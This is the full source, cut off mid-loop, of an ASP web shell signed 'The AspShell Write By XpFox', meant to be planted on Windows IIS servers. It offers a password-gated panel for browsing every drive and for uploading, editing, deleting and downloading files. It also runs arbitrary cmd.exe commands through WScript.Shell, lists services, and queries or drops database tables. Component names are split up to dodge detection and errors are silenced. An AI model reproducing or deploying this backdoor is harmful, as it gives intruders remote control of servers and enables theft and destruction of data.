<SCRIPT LANGUAGE="JavaScript">
function killErrors() {
return true;
}
window.onerror = killErrors;
</SCRIPT>
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_openBrWindow(theURL,winName,features) { //v2.0
  window.open(theURL,winName,features);
}

function MM_popupMsg(msg) { //v1.0
  alert(msg);
}
//-->
</script>
<script>
function ChangeDir(){
	if(MaoDiv.style.display=='block')
	{	
		MaoDiv.style.display = 'none';}
	else
	{
		MaoDiv.style.display = 'block';
		MaoDiv.innerHTML = "<CENTER><br> <input type=text name=DirName id=DirName VALUE='c:\\'> <input type=button onclick=\'javascript:if(DirName.value!=\"\"){location.href=\"?q=list.asp&attrib=true&path=\" + DirName.value;}\' value=GO> <font color=#999999 style=\'cursor:hand\' onclick=\'ChangeDir()\'>CLOSE</font></CENTER>";}

	MaoDiv.style.posLeft = window.event.x - 100;
	if(MaoDiv.style.posLeft < 0){
		MaoDiv.style.posLeft = 0;
	}
	MaoDiv.style.posTop = window.event.y + document.body.scrollTop - 10;
	}
</script>
<%Server.ScriptTimeOut=50000%>
<object runat=server id=oFileSys scope=page classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
<%
if Request("q")="exit" then
Session("Security")="" 
Response.write "<script>alert('�Ѿ��ɹ��˳�!!!');window.close();</script>"
end if
on error resume next
dim Data_5xsoft
Class upload_5xsoft
dim objForm,objFile,Version
Public function Form(strForm)
strForm=lcase(strForm)
if not objForm.exists(strForm) then
Form=""
else
Form=objForm(strForm)
end if
end function

Public function File(strFile)
strFile=lcase(strFile)
if not objFile.exists(strFile) then
set File=new FileInfo
else
set File=objFile(strFile)
end if
end function
Private Sub Class_Initialize 
dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
dim iFindStart,iFindEnd
dim iFormStart,iFormEnd,sFormName
Version="HTTP Uploader Version 2.0"
set objForm=server.CreateObject("Scr"&b&"ipting.Dictionary")
set objFile=server.CreateObject("Scr"&b&"ipting.Dictionary")
if Request.TotalBytes<1 then Exit Sub
set tStream = server.CreateObject("Ado"&l&"db.Stream") 
set Data_5xsoft = server.CreateObject("Ado"&l&"db.Stream") 
Data_5xsoft.Type = 1
Data_5xsoft.Mode =3
Data_5xsoft.Open
Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
Data_5xsoft.Position=0
RequestData =Data_5xsoft.Read 
iFormStart = 1
iFormEnd = LenB(RequestData)
vbCrlf = chrB(13) & chrB(10)
sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
iStart = LenB (sStart)
iFormStart=iFormStart+iStart+1
while (iFormStart + 10) < iFormEnd 
iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
tStream.Type = 1
tStream.Mode =3
tStream.Open
Data_5xsoft.Position = iFormStart
Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sInfo = tStream.ReadText
tStream.Close
iFormStart = InStrB(iInfoEnd,RequestData,sStart)
iFindStart = InStr(22,sInfo,"name=""",1)+6
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
if InStr (45,sInfo,"filename=""",1) > 0 then
set theFile=new FileInfo
iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileName=getFileName(sFileName)
theFile.FilePath=getFilePath(sFileName)
iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
iFindEnd = InStr(iFindStart,sInfo,vbCr)
theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileStart =iInfoEnd
theFile.FileSize = iFormStart -iInfoEnd -3
theFile.FormName=sFormName
if not objFile.Exists(sFormName) then
objFile.add sFormName,theFile
end if
else
tStream.Type =1
tStream.Mode =3
tStream.Open
Data_5xsoft.Position = iInfoEnd 
Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sFormValue = tStream.ReadText 
tStream.Close
if objForm.Exists(sFormName) then
objForm(sFormName)=objForm(sFormName)&", "&sFormValue    
else
objForm.Add sFormName,sFormValue
end if
end if
iFormStart=iFormStart+iStart+1
wend
RequestData=""
set tStream =nothing
End Sub
Private Sub Class_Terminate  
if Request.TotalBytes>0 then
objForm.RemoveAll
objFile.RemoveAll
set objForm=nothing
set objFile=nothing
Data_5xsoft.Close
set Data_5xsoft =nothing
end if
End Sub
Private function GetFilePath(FullPath)
If FullPath <> "" Then
GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
Else
GetFilePath = ""
End If
End  function
Private function GetFileName(FullPath)
If FullPath <> "" Then
GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
Else
GetFileName = ""
End If
End  function
End Class
Class FileInfo
dim FormName,FileName,FilePath,FileSize,FileType,FileStart
Private Sub Class_Initialize 
FileName = ""
FilePath = ""
FileSize = 0
FileStart= 0
FormName = ""
FileType = ""
End Sub
Public function SaveAs(FullPath)
dim dr,ErrorChar,i
SaveAs=true
if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
set dr=CreateObject("Ado"&l&"db.Stream")
dr.Mode=3
dr.Type=1
dr.Open
Data_5xsoft.position=FileStart
Data_5xsoft.copyto dr,FileSize
dr.SaveToFile FullPath,2
dr.Close
set dr=nothing 
SaveAs=false
end function
End Class
httpt = Request.ServerVariables("server_name")
Rseb = Request.ServerVariables("script_name")
q=request("q")
if q="" then q=rseb
select case q
case rseb
if Epass(trim(request.form("password")))="qtppfqttjv" then 
Session("Security")="situ" 
response.redirect rseb & "?q=list.asp" 
else %>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>����˾ͽר�ð�   <%=httpt%></title>
</head>
<body>
<%call css()%>

<table border=0 Align=center width=300 cellspacing="0" cellpadding="3"><tr>
<td width="100%" height="30%" bgcolor="#89b7f0"><p align="center">
<font color="#F7FBFF" face="Comic Sans MS" style="font-size: 9pt"><B>����Ա��½</B></font></td>
</tr>
<tr>
<td width="100%" height="70%" bgcolor="#F6F6F6"><form method="POST" action="<%=rseb%>?q=<%=rseb%>">
<div align="center"><center><p>
  <span style="font-size: 9pt">����: <input type="password" name="password"
size="10" style="background-color:#FFFFFF; border-left: none; border-right: none; border-top: none; border-bottom: solid 1px"> 
<input type="submit" value="��½" name="B1"></span></font></p>
</center></div>
</form>
</td>
</tr>
</table>
</font>
<%
if request.form("password")<>"" then 
response.write "<BR><BR><center><font color=red>�������,�벻Ҫ����</font></center>"
end if
%>
</body>
</html>
</font>
<%end if%>
<%case "down.asp"
if Session("Security")="xpfox" then 
call downloadFile(request("path"))
end if
function downloadFile(strFile)
strFilename = strFile
Response.Buffer = True
Response.Clear%>
<object runat=server id=s scope=page classid="clsid:00000566-0000-0010-8000-00AA006D2EA4"></object>
<%s.Open
s.Type = 1
if not oFileSys.FileExists(strFilename) then
Response.Write("<h1>Error:</h1>" & strFilename & " does not exist<p>")
Response.End
end if
Set f = oFileSys.GetFile(strFilename)
intFilelength = f.size
s.LoadFromFile(strFilename)
if err then
Response.Write("<h1>Error: </h1>" & err.Description & "<p>")
Response.End
end if
Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
Response.AddHeader "Content-Length", intFilelength
Response.CharSet = "UTF-8"
Response.ContentType = "application/octet-stream"
Response.BinaryWrite s.Read
Response.Flush
s.Close
Set s = Nothing
response.end
End Function 
case "list.asp"
urlpath=server.urlencode(path)
if Session("Security")="xpfox" then 
dim cpath,lpath
if Request("path")="" then
lpath="/"
else
lpath=Request("path")&"/"
end if
if Request("attrib")="true" then
cpath=lpath
attrib="true"
else
cpath=Server.MapPath(lpath)
attrib=""
end if
Sub GetFolder()
dim theFolder,theSubFolders
if oFileSys.FolderExists(cpath)then
Set theFolder=oFileSys.GetFolder(cpath)
Set theSubFolders=theFolder.SubFolders
Response.write "-<a href='" & rseb & "?q=list.asp&path="&Request("oldpath")&"&attrib="&attrib&"'><font color='ff2222'>�ϼ�Ŀ¼:</font></a><br><script language=vbscript>"
For Each x In theSubFolders
%>so "<%=lpath%>","<%=x.Name%>","<%=request("path")%>","<%=attrib%>"
<%
Next
%></script>
<%
end if
End Sub
Sub GetFile()
dim theFiles
if oFileSys.FolderExists(cpath)then
Set theFolder=oFileSys.GetFolder(cpath)
Set theFiles=theFolder.Files
Response.write"<table border='1' width='100%' cellpadding='2' cellspacing='0' bordercolorlight='#C6CDDF' bordercolordark='#FFFFFF'><script language=vbscript>" 
For Each x In theFiles
if Request("attrib")="true" then
showstring=x.Name
else
showstring=x.Name
end if
%>sf "<%=showstring%>","<%=x.size%>","<%=x.type%>","<%=x.Attributes%>","<%=x.DateLastModified%>","<%=lpath%>","<%=x.name%>","<%=attrib%>","<%=x.name%>"
<% 
Next
end if
Response.write"</script></table>"
End Sub
%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>ŵŵר�ð�<%=httpt%></title>
<%sub css()%>
<style type="text/css">
BODY,TD {
	FONT-SIZE: <%if UCase(Request.ServerVariables("HTTP_ACCEPT_LANGUAGE"))="ZH-TW" then response.write "10pt" else response.write "11px" end if%>; FONT-FAMILY: sans-serif,Verdana,����
	background-attachment: fixed;
	background-repeat: repeat-y;
	background-position: center;
}
Input {
	font-family: "Verdana", "Arial";
	font-size: <%if UCase(Request.ServerVariables("HTTP_ACCEPT_LANGUAGE"))="ZH-TW" then response.write "10pt" else response.write "12px" end if%>;
	font-style: normal;
	line-height: normal;
	font-weight: normal;
	font-variant: normal;
	height: 18px;
	border-right: 1px solid #e6f0ff;
	border-left: 1px solid #e6f0ff;
	border-top: 1px solid #e6f0ff;
	border-bottom: 1px solid #e6f0ff;
}
A:link {
	COLOR: #000000
}
A:visited {
	COLOR: #000000
}
A:active {
	COLOR: #000000
}
A {
	COLOR: #000000; TEXT-DECORATION: none
}
A:hover {
	COLOR: #495E6E
}
table{
	border-bottom: 1px solid #e6f0ff;
	border-top: 1px solid #e6f0ff;
	border-left: 1px solid #e6f0ff;
	border-right: 1px solid #e6f0ff;
	padding:0px
}
.table2{
	border-bottom: 0px;
	border-top: 0px;
	border-left: 0px;
	border-right: 0px;
	padding:0px
}
textarea {
	font-family: "Arial";
	font-size: 12
	font-style: normal;
	line-height: normal;
	font-weight: normal;
	font-variant: normal;
	background:#e6f0ff;
	border-bottom: 1px solid #e6f0ff;
	border-top: 1px solid #e6f0ff;
	border-left: 1px solid #e6f0ff;
	border-right: 1px solid #e6f0ff;
	padding:0px
}
input { border-top-width: 1px; padding-right: 1px; padding-left: 1px;
 border-left-width: 1px; border-bottom-width: 1px; border-right-width: 1px;
 background-color: #FFFFFF; cursor: hand;
 font-size: 9pt; font-family: Verdana, Arial, Helvetica, sans-serif, ??; color: #000000;
}
</style>
<%end sub
call css()
%>
</head>
<div id="MaoDiv" style="background: #F7FBFF;position: absolute; width:250px; height:60px; left:100; top:40; display:none; z-index:9;border-right: 1px solid #e6f0ff;border-left: 1px solid #e6f0ff;border-top: 1px solid #e6f0ff;border-bottom: 1px solid #e6f0ff;"></div>
<script language="JavaScript">
function crfile(ls)
{if (ls==""){alert("�������ļ�����!");}
else {window.open("<%=rseb%>?q=edit.asp&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
return false;
}
function crdir(ls)
{if (ls==""){alert("�������ļ���!");}
else {window.open("<%=rseb%>?q=edir.asp&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
return false;
}
</script>
<script language="vbscript">
sub sf(showstring,size,type1,Attributes,DateLastModified,lpath,xname,attrib,name)
document.write "<tr>"
document.write "<td width='40%'><a href='"& urlpath & lpath & xName &"' target='_blank'>" & showstring & "</a></td>"
document.write "<td width='10%' align='right'>" & round(size/1024,1) & " K</td>"
document.write "<td width='20%' align='center'>" & year(DateLastModified) & "-" & right("0"&month(DateLastModified),2) & "-" & right("0"&day(DateLastModified),2) & " " & FormatDateTime(DateLastModified,4) & "</td>"
document.write "<td width='30%' align='center'><a href='javascript:;' title='���ͣ�" & type1 & chr(10) & "���ԣ�" & Attributes & chr(10) & "ʱ�䣺" & DateLastModified &"'>����</a> <a href=javascript:; onClick=MM_openBrWindow('<%=rseb%>?q=edit.asp&path=" & lpath & xName & "&attrib=" & attrib &"','AspShell','scrollbars=no,status=yes,width=600,height=440')><font color='#FF8000'></font>�༭</a> <a href="&chr(34)&"javascript: rmdir1('"& lpath & xName &"')"&chr(34)&"><font color='#FF8000'></font>ɾ��</a> <a style='cursor:hand' onclick=copyfile('" & lpath & Name & "')><font color='#FF8000'></font>����</a> <a href='<%=rseb%>?q=down.asp&path=<%=cpath%>\"&xName&"&attrib=" & attrib &"'><font color='#FF8000'></font>����</a></td></tr>"
end sub
sub so(lpath,xName,path,attrib)
if len(xName)>26 then
DispName=left(xName,25)&".."
else
DispName=xName
end if
document.write "<font color=#FCC000>[</font>&nbsp;<a href='<%=rseb%>?q=list.asp&path="& lpath & xName & "&oldpath=" & path & "&attrib=" & attrib &"'>" & DispName &"</a>&nbsp;<font color=#FCC000>]</font>&nbsp;&nbsp;<a href="&chr(34)&"javascript: rmdir('"& lpath & xName &"')"&chr(34)&">&nbsp&nbsp&nbsp<font color='Blue'>��ɾ��</font></a> <br>"
end sub
sub rmdir1(ls)
if confirm("ȷ��ɾ���ļ�:"&ls&"?")   then
window.open("<%=rseb%>?q=edit.asp&path=" & ls & "&op=del&attrib=<%=request("attrib")%>")
end if
end sub
sub rmdir(ls)
if confirm("ȷ��ɾ���ļ���:"&ls&"?")   then
window.open("<%=rseb%>?q=edir.asp&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
end if
end sub
sub copyfile(sfile)
dfile=InputBox("ԭ��ַ:"&sfile&vbcrlf&"Ŀ���ַ:"&vbcrlf&"[Input path of current mode]")
dfile=trim(dfile)
attrib="<%=request("attrib")%>"
if dfile<>"" then 
if InStr(dfile,":") or InStr(dfile,"/")=1 then
lp=""
if InStr(dfile,":") and attrib<>"true" then
alert "No Absolute Path in relative mode!"&vbcrlf&"Error Path: ["&dfile&"]"
exit sub
end if
else
lp="<%=lpath%>"
end if
window.open("<%=rseb%>?q=edit.asp&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
else
alert "�������ļ���!"
end If
end sub
</script>
<body>
</font>
<table border=0 Align=center width=758 cellspacing="0" cellpadding="3">
<tr>
<td colspan=2 height=25>
<font style="font-size:12px" face=Arial><b>&nbsp;&nbsp;<%=httpt%>  &nbsp;&nbsp;&nbsp;&nbsp; ŵŵר�ð�</b></font></td>
</tr>
<tr><td colspan=2 height=5 bgcolor=#89b7f0></td></tr>
<tr>
<td width="100%" bgcolor="#F6F6F6" colspan="2" height="22">
<font style="font-size:12px" face=Arial>&nbsp;�̷�:<%
For Each thing in oFileSys.Drives
Response.write "<font color=#FCC000>[</font>&nbsp;<a href='" & rseb & "?q=list.asp&path="&thing.DriveLetter&":&attrib=true'><font color=blue>"&thing.DriveLetter&":</a></font>&nbsp;<font color=#FCC000>]</font>&nbsp;"
NEXT
set oScriptNet=Server.CreateObject("WSC"&e&"RIPT.NETWORK")
%>&nbsp;�����ַ:<font color=#FCC000>[</font>&nbsp;<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>&nbsp<font color=#FCC000>]</font>&nbsp;&nbsp;&nbsp;<font color=#FCC000>[</font>&nbsp;<a href="#" onClick="MM_openBrWindow('<%=rseb%>?q=jc.asp','AspShell','scrollbars=yes,width=800,height=600');MM_popupMsg('��ȡϵͳ����ʱ�е���\r\r   �벻Ҫ��Ϊ������')">���̲鿴</a><font color=#FCC000>]</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color=#FCC000>[</font>&nbsp;<a href="<%=rseb%>?q=exit">�˳�</a>&nbsp;<font color=#FCC000>]</font>&nbsp;</font></td>
</tr>
<tr>
<td width="100%" bgcolor="#F6F6F6" colspan="2" height="22">
<font style="font-size:12px" face=Arial>&nbsp;�л���:<%
if Request("attrib")="true"  then
response.write "<font color=#FCC000>[</font>&nbsp;<a href='" & rseb & "?q=list.asp'>��վĿ¼</a>&nbsp;<font color=#FCC000>]</font>"
else
response.write "<font color=#FCC000>[</font>&nbsp;<a href='" & rseb & "?attrib=true&q=list.asp'>����ģʽ</a>&nbsp<font color=#FCC000>]</font>"
end if
iisver =Request.ServerVariables("SERVER_SOFTWARE")
%>
&nbsp; ��ǰ·��:<font color=#999999 title="�����ת��ָ��Ŀ¼" style="cursor:hand" onclick="ChangeDir()"> <font color=#FCC000>[</font>&nbsp;<%=cpath%>&nbsp<font color=#FCC000>]</font></font>&nbsp&nbsp&nbsp ������Ip��ַ: <font color=#FCC000>[</font>&nbsp;<a href="Http://Www.XpFox.Com/IpView.Asp?IpData=<%=Request.ServerVariables("LOCAL_ADDR")%>" target="_blank"><%=Request.ServerVariables("LOCAL_ADDR")%></a>&nbsp<font color=#FCC000>]</font> 
&nbsp&nbsp&nbsp IIS�汾:<font color=#FCC000>[</font>&nbsp;<%=iisver%>&nbsp<font color=#FCC000>]</font> </font>
</td>
</tr>
<tr><td colspan=2 bgcolor=#0099FF height=2></td></tr>
<form name="form1" method="post" action="<%=rseb%>?q=upfile.asp" target="_blank" enctype="multipart/form-data">
<tr height="25">
<td bgcolor="#F6F6F6" colspan="2"><font style="font-size:12px" face=Arial>&nbsp;
<input class="table" type="text" name="filename" size="20">
<input class="table" type="button" value="�����ļ�" onclick="crfile(form1.filename.value)">
<input class="table" type="button" value="�����ļ���" onclick="crdir(form1.filename.value)">
<input type="file" name="file1" class="table" style="width:100" value="" size="30">
<input type="text" name="filepath" class="table" style="width:100" value="<%=cpath%>" size="30">
<input type="hidden" name="act" value="upload">
<input type="hidden" name="upcount" class="table" value="1">
<input class="table" type="submit" value="�ϴ�">
<input class="table" type="button" onclick="window.open('<%=rseb%>?q=cmd.asp','_blank')"  value="CMD">
<input class="table" type="button" onclick="window.open('<%=rseb%>?q=p.asp','_blank')"  value="��FSO">
<input class="table" type="button" onclick="window.open('<%=rseb%>?q=sql.asp','_blank')"  value="���ݹ���">
</span>
</td>
</font>
</td>
</tr></form>
<tr>
<td colspan=2 bgcolor=#0099FF height=2>
</td>
</tr>
<tr>
<td width="25%" valign="top" bgcolor="#F6F6F6"><%Call GetFolder()%></td>
<td width="75%" valign="top"><%Call GetFile()%></td>
</tr>
</table>
<table border=0 Align=center width=758 cellspacing="0" cellpadding="3">
<tr><td colspan=2 height=5 bgcolor=#89b7f0></td></tr>
<tr>
</td>
<td colspan=2 Align=Right style="font-family:sans-serif,Verdana;font-size:11px;color:red">The AspShell Write By XpFox</td>
</tr>
</table>
</body>
</html>
<%else
call css()
response.write "�����������ӳ�ʱ!"
response.write "<a href='" & rseb & "?q=" & rseb & "'>�������µ�½</a>"
end if
%> 
<%case "edit.asp"%>
<html>
<head>
<meta HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=gb2312">
<title>�༭�ļ�</title>
<%call css()%>
</head>
</span></font>
<body>
<% 
if Session("Security")="xpfox" then 
if request("op")="del"  then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if 
Set thisfile = oFileSys.GetFile(whichfile)
thisfile.Delete True
Response.write "<script>alert('ɾ���ļ��ɹ�,�뷵��ˢ��!!!');window.close();</script>"
else
if request("op")="copy" then
if Request("attrib")="true" then
whichfile=Request("path")
dsfile=Request("dpath")
else
whichfile=server.mappath(Request("path"))
dsfile=Server.MapPath(Request("dpath"))
end if 
Set thisfile = oFileSys.GetFile(whichfile)
thisfile.copy dsfile
%>
<script language=vbscript>
msgbox "Source File<%=whichfile%>" & vbcrlf & " Intent File:<%=dsfile%>" & vbcrlf & "�����ļ��ɹ�,�뷵��ˢ��!!!"
window.close()
</script>
<%
else
if request.form("text")="" then
if Request("creat")<>"yes" then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if 
 Set thisfile = oFileSys.OpenTextFile(whichfile, 1, False)
 counter=0
 thisline=thisfile.readall
 thisfile.Close
 set fs=nothing
end if
%>
<form method="POST" action="<%=rseb%>?q=edit.asp">
<font style="font-size:12px" face=Arial>
<input type="hidden" name="attrib" value="<%=Request("attrib")%>">
</font>
<table border="0" width="350" cellpadding="0" cellspacing="0">
<tr>
<td width="100%"><font face="Comic Sans MS"><span style="font-size: 9pt">�ļ���:<input type="text" name="path" size="20" value="<%=Request("path")%>" style="border:solid 1px"> <input type="submit" value=" ���� " name="B1">  <input type=button value=Close onclick="window.close()">&nbsp;<font color="Red">ֱ�Ӹ����ļ������൱�ڡ����Ϊ��</font></span></font></td>
</tr>
<tr>
<td colspan=2><font style="font-size:12px" face=Arial>
<textarea rows="23" name="text" cols="95" style="border:solid 1px"><%=replace(thisline,"</textarea>","&lt;/textarea&gt;")%></textarea></font></td>
</tr>
</table>
</form>
<%else
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if 
 Set outfile=oFileSys.CreateTextFile(whichfile)
 outfile.WriteLine Request("text")
 outfile.close 
 set fs=nothing
Response.write "<script>alert('�޸��ļ��ɹ�,�뷵��ˢ��!!!');window.close();</script>"
end if
end if
end if
else
call css()
response.write "�����������ӳ�ʱ!"
response.write "<a href='" & rseb & "?q=" & rseb & "'>Back</a>"
end if
%>
<font style="font-size:12px" face=Arial>
</body>
</html>
<%case "edir.asp"%>
<html>
<head>
<meta HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=gb2312">
<title>�ļ�����</title>
</head>
<body>
<%
call css()
if Session("Security")="xpfox" then 

if request("op")="del"  then

if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if 
oFileSys.DeleteFolder whichdir,True
Response.write "ɾ���ļ��ɹ�:   " & whichdir & " �뷵��ˢ��!!!"
else
if request("op")="creat"  then
if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if 
oFileSys.CreateFolder whichdir
Response.write "�����ļ�����:" & whichdir & " �뷵��ˢ��!!!"
end if
end if
else
call css()
response.write "�����������ӳ�ʱ!"
response.write "<a href='" & rseb & "?q=" & rseb & "'>�������µ�½</a>"
end if
%>
</body>
</html>
<%
case "upfile.asp"
if Session("Security")="xpfox" then 
set upload=new upload_5xSoft
if upload.form("filepath")="" then
HtmEnd "Input Path!"
set upload=nothing
response.end
else
formPath=upload.form("filepath")
if right(formPath,1)<>"/" then formPath=formPath&"/" 
end if

iCount=0
for each formName in upload.objFile
set file=upload.file(formName)
if file.FileSize>0 then
 file.SaveAs formPath & file.FileName
 response.write file.FilePath&file.FileName&" ("&file.FileSize&") => "&formPath&File.FileName&" Succeed!<br>"
 iCount=iCount+1
end if
set file=nothing
next
set upload=nothing
Htmend iCount&" Files Uploaded!"

sub HtmEnd(Msg)
set upload=nothing
Response.write "�ϴ��ļ��ɹ�,�뷵��ˢ��!!!<P><input value=Close type=button onclick=window.close();>"
response.end
end sub
else
call css()
response.write "�����������ӳ�ʱ!"
response.write "<a href='" & rseb & "?q=" & rseb & "'>�������µ�½</a>"
end if

case "cmd.asp"
if Session("Security")<>"xpfox" then 
call css()
response.write "�����������ӳ�ʱ!"
response.write "<a href='" & rseb & "?q=" & rseb & "'>�������µ�½</a>"
else
Call Css()%>
<HTML>
<BODY>
<title>ASP Shell</title>
<FORM action="<%=rseb%>?q=cmd.asp" method="POST">
<input type=text name=".CMD" size=45 value="<%= szCMD %>">
<input type=submit value="ִ��CMD"> </span></font>
</FORM>
</HTML>
<%
set oScript=Server.CreateObject("WSC"&y&"RIPT.shell")
  On Error Resume Next
  szCMD = Request.Form(".CMD")
  If (szCMD <> "") Then
  response.write"<font face=Comic Sans MS style=font-size: 9pt><textarea readonly cols=79 rows=22 name=text style='border:solid 1px'>"
  response.write oScript.exec ("cmd.exe /c "& szCMD).stdout.readall
  response.write"--------------------------The AspShell Write By XpFox--------------------------"
  response.write"</textarea></font>"
End If
end if
case "jc.asp"
on error resume next
call css()
Response.Write "<html><title>���̲鿴</title>"
Response.Write "<table border=0 Align=center width=758 cellspacing=0 cellpadding=3>"
set domainObject = GetObject("WinNT://.")
for each obj in domainObject
  if  mid(obj.path,4,3) <>"win" and mid(obj.path,4,3) <>"WIN" and OBJ.StartType=2 then
 N2=N2&obj.Name&"--"&obj.DisplayName &"--"&OBJ.StartType&"<br><font color=#FF0000>"&obj.path& "</font><br><BR>"
  else
 N1=N1&obj.Name&"--"&obj.DisplayName &"--"&OBJ.StartType&"<br><font color=#008000>"&obj.path& "</font><br><BR>"
  end if
next
set domainObject=nothing
RESPONSE.WRITE N2&N1
Response.Write "</body></html>"
case "sql.asp"
if Session("Security")<>"xpfox" then 
call css()
response.write "�����������ӳ�ʱ!"
response.write "<a href='" & rseb & "?q=" & rseb & "'>�������µ�½</a>"
else
call css()
Function HTMLEncode(S)
  if not isnull(S) then
    S = replace(S, ">", "&gt;")
    S = replace(S, "<", "&lt;")
    S = replace(S, CHR(39), "&#39;")
    S = replace(S, CHR(34), "&quot;")
    HTMLEncode = S
  end if
End Function
  SqlStr=Trim(Request.Form("SqlStr"))
  DbStr=Request.Form("DbStr")
  Fox=Fox&"<table width='758' Align=center border='0' cellspacing='0' cellpadding='0'>"
  Fox=Fox&"<form name='DbForm' method='post' action=''>"
  Fox=Fox&"<tr><td width='100' height='27'> &nbsp;���ݿ����Ӵ�:</td>"
  Fox=Fox&"<td><input name='DbStr' style='width:100%' value="""&DbStr&"""></td>"
  Fox=Fox&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>���Ӵ�ʾ��</option><option value=0>Access����</option>"
  Fox=Fox&"<option value=1>MsSql����</option><option value=2>MySql����</option><option value=3>DSN����</option>"
  Fox=Fox&"<option value=-1>--SQL�﷨--</option><option value=4>��ʾ����</option><option value=5>�������</option>"
  Fox=Fox&"<option value=6>ɾ������</option><option value=7>�޸�����</option><option value=8>�����ݱ�</option>"
  Fox=Fox&"<option value=9>ɾ���ݱ�</option><option value=10>����ֶ�</option><option value=11>ɾ���ֶ�</option>"
  Fox=Fox&"<option value=12>��ȫ��ʾ</option></select></td></tr>"
  Fox=Fox&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  Fox=Fox&"<tr><td height='30'>&nbsp;SQL��������:</td>"
  Fox=Fox&"<td><input name='SqlStr' style='width:100%' value="""&SqlStr&"""></td>"
  Fox=Fox&"<td align='center'><input type='submit' name='Submit' value='ִ��' onclick='return DbCheck()'></td>"
  Fox=Fox&"</tr></form></table>"
  Fox=Fox&"<table width='758' Align=center border='0' cellspacing='0' cellpadding='0'><tr><td width=64><div align=left>����</div></td><td width=112><div align=left>MD5ֵ 16λ��</div></td><td width=224><div align=left>MD5ֵ 32λ�� </div></td></tr><tr><td><div align=left>admin</div></td><td><div align=left>7a57a5a743894a0e</div></td><td><div align=left>21232f297a57a5a743894a0e4a801fc3</div></td></tr><tr><td><div align=left>123789456</div></td><td><div align=left>adc42a3aa87fcfed</div></td><td><div align=left>303afa47adc42a3aa87fcfedbbdf2652</div></td></tr></table></center>"
  Fox=Fox&"<span id='abc'></span>"
  Response.Write Fox:Fox=""
  If Len(DbStr)>40 Then
  Set Conn=CreateObject("Adodb.connection")
  Conn.Open DbStr
  Set Rs=Conn.OpenSchema(20) 
  Fox=Fox&"<table><tr height='25' Bgcolor='#CCCCCC'><td>��<br>��</td>"
  Rs.MoveFirst 
  Do While Not Rs.Eof
    If Rs("TABLE_TYPE")="TABLE" then
	  TName=Rs("TABLE_NAME")
      Fox=Fox&"<td align=center><a href='javascript:FullSqlStr(""DROP TABLE ["&TName&"]"",1)'>[ del ]</a><br>"
      Fox=Fox&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
    End If 
    Rs.MoveNext 
  Loop 
  Set Rs=Nothing
  Fox=Fox&"</tr></table>"
  Response.Write Fox:Fox=""
  If Len(SqlStr)>10 Then
  If LCase(Left(SqlStr,6))="select" then
    Fox=Fox&"ִ����䣺"&SqlStr
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=20
    Count=Rs.PageSize
    PN=Rs.PageCount
    Page=request("Page")
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    Fox=Fox&"<table><tr height=25 bgcolor=#cccccc><td></td>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      Fox=Fox&"<td align='center'>"&Fld.Name&"</td>"
      Set Fld=nothing
    Next
    Fox=Fox&"</tr>"

    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  Fox=Fox&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    Fox=Fox&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
	  Next
